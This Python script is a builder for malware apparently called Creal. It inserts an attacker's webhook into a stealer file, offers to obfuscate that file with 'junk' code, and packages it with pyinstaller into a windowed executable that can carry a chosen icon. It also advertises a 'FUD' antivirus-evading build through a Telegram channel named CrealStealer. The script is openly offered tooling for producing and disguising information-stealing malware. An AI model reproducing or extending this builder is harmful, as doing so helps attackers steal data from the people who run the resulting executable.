import os
import subprocess
import time
from tkinter import filedialog, Tk
from colorama import Fore, Style
from pystyle import Write, Colors, Center, Colorate

# Clear the console screen
os.system('clear' if os.name == 'posix' else 'cls')

intro = """

 ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
  █       ▄▀    █    █    ▌   ▄▀   █     █       
 ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
▐                   ▐                  ▐         

                > Press Enter                                         

"""

Write.Print(intro, Colors.black_to_red, Style.Bold, Style.Underline)

Write.Print(f"""
 ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
  █       ▄▀    █    █    ▌   ▄▀   █     █       
 ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
▐                   ▐                  ▐          

            Welcome to builder
""", Colors.red_to_yellow, Style.Bold)

time.sleep(1)

while True:
    Write.Print("\nWhich option do you want to choose:")
    Write.Print("\n1. Build Exe")
    Write.Print("\n2. Build FUD Exe (Virus programs undetected)")
    Write.Print("\n3. Close")
    choice = input("\nMake your selection: ")

    if choice == "1":
        os.system("cls" if os.name == "nt" else "clear")
        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "Creal.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.")

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")  # Assuming "junk.py" is your obfuscation script
                Write.Print(f"\n{filename} The file has been junked.")
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.")

        answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
            answer = input(Fore.CYAN + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                Tk().withdraw()
                icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
                if icon_file:
                    subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
                    Write.Print(f"\n{filename} has been converted to exe with the selected icon.")
                else:
                    Write.Print("\nThe file you choose must have .ico extension!")
            else:
                subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
                Write.Print(f"\n{filename} The file has been converted to exe.")

    elif choice == "2":
        Write.Print("\nWe can share the fud for free but not now. if you want fud Telegram: https://t.me/CrealStealer")

    elif choice == "3":
        Write.Print("\nExiting the program...")
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.")

